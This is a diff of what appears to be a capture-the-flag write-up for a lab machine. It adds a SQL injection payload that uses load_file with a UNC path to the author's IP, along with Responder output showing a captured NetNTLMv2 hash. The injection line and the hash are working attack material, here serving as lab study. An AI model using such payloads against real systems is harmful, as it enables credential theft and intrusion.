@@ -121,9 +121,25 @@ I also successfully got a NetNTLMv2 hash for the user (just like in Giddy and 
 `term=10' UNION SELECT 1,load_file('\\\\10.10.14.5\\test'),3-- -`:
 ```
 
+Querying `term=1'union select load_file('\\\\10.10.14.2\\test'),2,3;-- -`
 ```
-Query -> term=1'union select load_file('\\\\10.10.14.2\\test'),2,3;-- -
 
+➜  ~ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+  
 [+] Listening for events...
 
 [*] [LLMNR]  Poisoned answer sent to 10.10.14.2 for name archlinux
@@ -137,3 +153,6 @@ Query -> term=1'union select load_file('\\\\10.10.14.2\\test'),2,3;-- -
 [SMB] NTLMv2-SSP Hash     : Cortin::BANKROBBER:e77408bc427cbc60:61607960ABEA68B1737992BF460FF670:010100000000000000865F6D96C2D901D79B3453124449620000000002000800520059003200590001001E00570049004E002D0053004D004D0036004D0050004D00390050004100340004003400570049004E002D0053004D004D0036004D0050004D0039005000410034002E0052005900320059002E004C004F00430041004C000300140052005900320059002E004C004F00430041004C000500140052005900320059002E004C004F00430041004C000700080000865F6D96C2D901060004000200000008003000300000000000000000000000002000003E4CAE96D9B7A0B88500929A65CACF3540353FCDED9B6C48C1B073BD950446B00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003200000000000000000000000000
 
 ```
+
+I don't know why this worked and Osanda's did not. I will have to continue reading about it.
+
